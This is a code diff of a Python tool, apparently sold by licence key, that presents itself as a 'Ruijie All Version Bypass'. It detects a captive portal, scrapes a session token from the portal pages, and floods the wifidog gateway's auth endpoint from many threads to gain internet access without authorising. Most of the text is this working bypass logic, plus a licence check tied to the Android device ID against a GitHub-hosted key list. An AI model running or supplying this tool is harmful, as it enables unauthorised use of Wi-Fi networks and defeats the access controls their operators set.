@@ -1,184 +1,182 @@
 import requests
-import subprocess
 import re
 import urllib3
 import time
 import threading
 import logging
 import random
-import sys
-import datetime
 import os
+import json
 import socket
+import subprocess 
+from datetime import datetime
 from urllib.parse import urlparse, parse_qs, urljoin
 
-# SSL Disable
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ===============================
-# GLOBAL CONFIGURATION
+# ⚙️ CONFIG & DATABASE
 # ===============================
-VALID_KEYS_URL = "https://raw.githubusercontent.com/Zyan091/my-database/refs/heads/main/key.txt"
-PING_THREADS = 25  # Maximum Power
-MIN_INTERVAL = 0.00001 # Extreme Frequency
-MAX_INTERVAL = 0.0001
+VALID_KEYS_URL = "https://raw.githubusercontent.com/Zyan091/my-database/main/key.txt"
+LOCAL_DB = ".zyan_vault.json"
+PING_THREADS = 15
+MIN_INTERVAL = 0.001
+MAX_INTERVAL = 0.01
+DEBUG = False
 
-# GOD MODE COLORS
-R = "\033[38;5;196m" # Red
-G = "\033[38;5;46m"  # Green
-C = "\033[38;5;51m"  # Cyan
-Y = "\033[38;5;226m" # Yellow
-M = "\033[38;5;201m" # Magenta
-W = "\033[38;5;255m" # White
-B = "\033[38;5;21m"  # Blue
-GOLD = "\033[38;5;220m"
-RESET = "\033[0m"
+# COLORS
+R = "\033[91m"; G = "\033[92m"; C = "\033[96m"
+Y = "\033[93m"; M = "\033[95m"; GD = "\033[38;5;220m"; RS = "\033[0m"
 
 stop_event = threading.Event()
 
 # ===============================
-# SYSTEM TOOLS
+# 🔑 SECURITY ENGINE (Zyan's Update)
 # ===============================
 def get_hwid():
     try:
-        user_id = subprocess.check_output('whoami', shell=True).decode().strip()
-        return f"ZYAN-GOD-{user_id.upper()}-8899"
+        # Android Device ID ကို ပုံသေဆွဲထုတ်ခြင်း
+        device_id = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode().strip()
+        return f"{device_id}{{Rs}}" # အနောက်မှာ {Rs} ပါအောင် ပေါင်းပေးထားသည်
     except:
-        return "ZYAN-GOD-USER"
+        return "ZYAN-DEVICE-USER{Rs}"
 
-def clear(): os.system('clear')
-
-def god_banner():
-    clear()
-    banner = f"""
-{R}    ╔═══════════════════════════════════════════════════════════╗
-{GOLD}       🌸  ❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️  🌸
-{M}       ███████╗██╗   ██╗ █████╗ ███╗   ██╗  ██████╗  ██████╗ 
-{M}       ╚══███╔╝╚██╗ ██╔╝██╔══██╗████╗  ██║ ██╔════╝ ██╔═══██╗
-{M}         ███╔╝  ╚████╔╝ ███████║██╔██╗ ██║ ██║  ███╗██║   ██║
-{M}        ███╔╝    ╚██╔╝  ██╔══██║██║╚██╗██║ ██║   ██║██║   ██║
-{M}       ███████╗   ██║   ██║  ██║██║ ╚████║ ╚██████╔╝╚██████╔╝
-{M}       ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚═════╝  ╚═════╝ 
-{GOLD}       🌸  ❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️❤️  🌸
-{R}    ╚═══════════════════════════════════════════════════════════╝
-{C}               >>> GOD MODE: SUPREME NETWORK ENGINE <<<
-    """
-    print(banner)
-
-# ===============================
-# SUPREME SECURITY
-# ===============================
 def verify_access():
     my_id = get_hwid()
-    god_banner()
-    print(f"{C} 🛠  DEVICE INFO: {W}{my_id}{RESET}")
-    print(f"{C} ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
-    
-    key = input(f"\n{W} [?] ACCESS KEY {G}» {GOLD}").strip()
-    if not key: return False
+    today = datetime.now().date()
 
-    print(f"{Y} [*] Authorizing via Cloud...{RESET}", end="\r")
+    # ၁။ ID ကို အရင်ပြသခြင်း (ဒါမှ ဝယ်သူက Admin ဆီ ပို့လို့ရမှာပါ)
+    os.system('clear')
+    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RS}")
+    print(f"{GD}   ZYAN NETWORK PREMIER - SECURITY SYSTEM{RS}")
+    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RS}")
+    print(f"\n{Y}[!] YOUR DEVICE ID :{RS} {G}{my_id}{RS}")
+    print(f"{Y}[!] Send this ID to Admin to buy Key.{RS}")
+    print(f"{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RS}")
+
+    # ၂။ Offline Login Check
+    if os.path.exists(LOCAL_DB):
+        try:
+            with open(LOCAL_DB, 'r') as f:
+                saved = json.load(f)
+                exp_date = datetime.strptime(saved['exp'], "%Y-%m-%d").date()
+                if saved['id'] == my_id and today <= exp_date:
+                    print(f"{G}[✓] ACCESS VERIFIED (Offline Mode){RS}")
+                    time.sleep(1.5)
+                    return True
+                else:
+                    os.remove(LOCAL_DB)
+        except:
+            if os.path.exists(LOCAL_DB): os.remove(LOCAL_DB)
+
+    # ၃။ Key တောင်းခြင်း
+    u_key = input(f"\nENTER ACCESS KEY: {GD}").strip()
+    if not u_key: return False
+
+    print(f"{Y}[*] Connecting to database...{RS}", end="\r")
     try:
-        res = requests.get(VALID_KEYS_URL, timeout=15)
-        if res.status_code == 200:
-            for line in res.text.splitlines():
+        r = requests.get(f"{VALID_KEYS_URL}?t={time.time()}", timeout=15)
+        if r.status_code == 200:
+            for line in r.text.splitlines():
                 if "|" in line:
-                    db_key, db_id, exp = [i.strip() for i in line.split("|")]
-                    if key == db_key:
-                        if db_id != my_id:
-                            print(f"\n{R} [!] LOCK ERROR: Registered to {db_id}{RESET}")
+                    k, i, d = [p.strip() for p in line.split("|")]
+                    if u_key == k and i == my_id:
+                        exp_date = datetime.strptime(d, "%Y-%m-%d").date()
+                        if today <= exp_date:
+                            with open(LOCAL_DB, 'w') as f:
+                                json.dump({'key':k, 'id':i, 'exp':d}, f)
+                            print(f"\n{G}✅ ACCESS GRANTED! (EXP: {d}){RS}")
+                            time.sleep(2)
+                            return True
+                        else:
+                            print(f"\n{R}❌ THIS KEY HAS EXPIRED! ({d}){RS}")
                             return False
-                        
-                        exp_dt = datetime.datetime.strptime(exp, '%Y-%m-%d')
-                        if datetime.datetime.now() > exp_dt:
-                            print(f"\n{R} [!] KEY EXPIRED!{RESET}")
-                            return False
-                        
-                        print(f"\n{G} [✓] WELCOME GOD USER. ACCESS GRANTED!{RESET}")
-                        time.sleep(1)
-                        return True
-            print(f"\n{R} [X] INVALID KEY.{RESET}")
-        else: print(f"\n{R} [!] DATABASE OFFLINE.{RESET}")
-    except: print(f"\n{R} [!] NETWORK ERROR.{RESET}")
+            print(f"\n{R}❌ INVALID KEY OR ID MISMATCH!{RS}")
+        else:
+            print(f"\n{R}❌ SERVER ERROR: {r.status_code}{RS}")
+    except:
+        print(f"\n{R}❌ NETWORK ERROR! Check Internet.{RS}")
     return False
 
 # ===============================
-# GOD-SPEED BYPASS ENGINE
+# 🚀 CORE LOGIC (မူရင်းအတိုင်း မထိခိုက်စေရ)
 # ===============================
-def check_internet():
+def check_real_internet():
     try:
-        # DNS Check (Faster)
-        socket.setdefaulttimeout(2)
-        socket.gethostbyname("www.google.com")
-        return True
+        return requests.get("http://www.google.com", timeout=3).status_code == 200
     except: return False
 
-def high_frequency_pulse(auth_link, sid):
+def banner():
+    print(f"""{M}
+╔══════════════════════════════════════════════════════╗
+║      Ruijie All Version Bypass - ZYAN ELITE          ║
+║      Engine Status: {G}STABLE{M} / Mode: {G}TURBO{M}             ║
+╚══════════════════════════════════════════════════════╝
+{RS}""")
+
+def high_speed_ping(auth_link, sid):
     session = requests.Session()
-    # Advanced Headers
-    headers = {
-        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-        'Accept': '*/*',
-        'Connection': 'keep-alive',
-        'Cache-Control': 'no-cache'
-    }
+    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 11)'}
     while not stop_event.is_set():
         try:
-            session.get(auth_link, headers=headers, timeout=3, verify=False)
-            # Live Status Animation
-            icons = ["🔥", "⚡", "✨", "🚀"]
-            print(f"{G}[GOD-MODE]{RESET} {GOLD}BYPASSING{RESET} {random.choice(icons)} {C}SID:{sid[:5]}{RESET} | {R}FREQ: MAX{RESET}   ", end="\r")
+            session.get(auth_link, headers=headers, timeout=5)
+            print(f"{G}[✓]{RS} SID {sid[:10]} | {GD}Pulse Active{RS} 🔥       ", end="\r")
         except: break
         time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
 
-def start_god_engine():
-    god_banner()
-    print(f"{Y}[*] Injecting God-Mode Pulse...{RESET}")
-    
+def start_process():
+    os.system('clear')
+    banner()
+    logging.info(f"{C}Initializing Turbo Engine (Threads: {PING_THREADS})...{RS}")
+
     while not stop_event.is_set():
+        session = requests.Session()
+        test_url = "http://connectivitycheck.gstatic.com/generate_204"
         try:
-            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5)
-            if r.status_code == 204 and check_internet():
-                print(f"{G}[•]{RESET} Connection Supreme. Monitoring...          ", end="\r")
-                time.sleep(5); continue
+            r = requests.get(test_url, allow_redirects=True, timeout=5)
+            if r.url == test_url:
+                if check_real_internet():
+                    print(f"{Y}[•]{RS} Internet Active... Monitoring      ", end="\r")
+                    time.sleep(5); continue
 
             portal_url = r.url
-            print(f"\n{M}[!] FIREWALL DETECTED! CRACKING...{RESET}")
+            parsed_portal = urlparse(portal_url)
             
-            # Phase 1: Capture
-            res = requests.Session().get(portal_url, verify=False, timeout=10)
-            sid = None
+            print(f"\n{C}[*] Captive Portal Detected: {portal_url}{RS}")
             
-            # Deep Scan for SID
-            sid_patterns = [r'sessionId=([a-zA-Z0-9\-]+)', r'token=([a-zA-Z0-9\-]+)', r'id=([a-zA-Z0-9\-]+)']
-            for pattern in sid_patterns:
-                match = re.search(pattern, res.url) or re.search(pattern, res.text)
-                if match:
-                    sid = match.group(1); break
-            
+            r1 = session.get(portal_url, verify=False, timeout=10)
+            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
+            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
+            r2 = session.get(next_url, verify=False, timeout=10)
+
+            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
+            if not sid:
+                sid_match = re.search(r'sessionId=([a-zA-Z0-9\-]+)', r2.text)
+                sid = sid_match.group(1) if sid_match else None
+
             if sid:
-                print(f"{G}[✓] SYSTEM CRACKED! TOKEN: {GOLD}{sid}{RESET}")
-                params = parse_qs(urlparse(portal_url).query)
-                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
+                print(f"{G}[✓]{RS} Session ID Captured: {GD}{sid}{RS}")
+                params = parse_qs(parsed_portal.query)
+                gw_addr = params.get('gw_address', ['192.168.110.1'])[0]
                 gw_port = params.get('gw_port', ['2060'])[0]
-                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber={random.randint(10000,99999)}"
 
-                # Phase 2: Ultimate Pulse
-                print(f"{C}[*] WAKING UP {PING_THREADS} GOD-THREADS...{RESET}")
+                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&p={random.randint(111,999)}"
+
                 for _ in range(PING_THREADS):
-                    threading.Thread(target=high_frequency_pulse, args=(auth_link, sid), daemon=True).start()
+                    threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()
 
-                while check_internet():
+                while check_real_internet():
                     time.sleep(10)
-                    if stop_event.is_set(): break
-        except: time.sleep(5)
+            else:
+                time.sleep(5)
+        except Exception as e:
+            time.sleep(5)
 
 if __name__ == "__main__":
     try:
+        # Security Verify အရင်လုပ်ပြီးမှ အထဲဝင်ခွင့်ပေးမည်
         if verify_access():
-            start_god_engine()
-        else:
-            input(f"\n{W} Press Enter to Exit...{RESET}")
+            start_process()
     except KeyboardInterrupt:
         stop_event.set()
-        print(f"\n{R} [!] GOD MODE TERMINATED.{RESET}")
+        print(f"\n{R}🛑 Engine Shutdown Safe.{RS}")        
